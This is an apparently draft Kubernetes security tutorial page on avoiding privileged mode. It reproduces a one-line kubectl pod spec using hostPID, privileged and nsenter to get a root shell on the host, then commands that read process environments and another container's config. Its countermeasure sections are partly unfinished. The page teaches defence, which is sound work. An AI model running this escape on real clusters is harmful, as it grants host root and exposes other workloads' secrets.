+++
categories = []
date = "2020-02-20"
description = ""
slug = ""
tags = []
title = "Avoid privileged mode"
draft = false
toc = true
weight = 65
+++

### Introduction
In this use case, we cover:
 - What `--privileged` mode does
 - The crazy things it allows
 - How you might be able to replace it

### How to use it yourself
use the capabilities field in the pod securitycontext (container??) rather than privileged mode

to know what caps you need, consider "capable"

remember that all of these changes should go through CI and testing

### Setup
We'll exec directly into a container in this example.

This example is based on Ian Coldwater and Duffie Cooley's example from [Black Hat USA 2019](https://github.com/mauilion/blackhat-2019).

As a preliminary step, we'll deploy nginx and then spy on it later.
_(Note: adjust the replica count to match the number of nodes in your cluster.)_

```
kubectl create deployment nginx --image=nginx:stable
kubectl scale deployment nginx --replicas 2
kubectl get pods -w
```

To start, we'll use [Duffie Cooley's "one tweet to root"](https://twitter.com/mauilion/status/1129468485480751104)—it takes less than 280 characters!

```
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
```

Here's that spec again, pretty-printed:
```json
{
  "spec": {
    "hostPID": true,
    "containers": [
      {
        "name": "1",
        "image": "alpine",
        "command": [
          "nsenter",
          "--mount=/proc/1/ns/mnt",
          "--",
          "/bin/bash"
        ],
        "stdin": true,
        "tty": true,
        "securityContext": {
          "privileged": true
        }
      }
    ]
  }
}
```

You'll notice:
 - `"hostPID": true` — The container is entering the host's process (PID) namespace
 - `"privileged": true` — The container is running in `--privileged` mode
 - `"stdin": true, "tty": true` — We'll attach a terminal to the running container when it starts
 - `"command"` — It's going to start out using `nsenter` to go into the **host**'s PID 1 (first process)

### "Attack"
Once we are in this shell, we can do some fun stuff to explore the host and learn about other processes and containers.

```
ls /proc/*/env

pgrep -a nginx
(nsenter -n -t $(pgrep nginx | head -n1) ss -ln)
(nsenter -m -t $(pgrep nginx | head -n1) cat /etc/nginx/nginx.conf)
```

TODO host manipulations

### Countermeasure
Avoid `--privileged` mode and `hostPID` unless super necessary.

Consider applying admission control (using a dynamic admission controller or a `PodSecurityPolicy`) to block privileged containers by default.

### Attack effects after patching

- With `hostPID: false`:
- With `privileged: false`:
- With both:
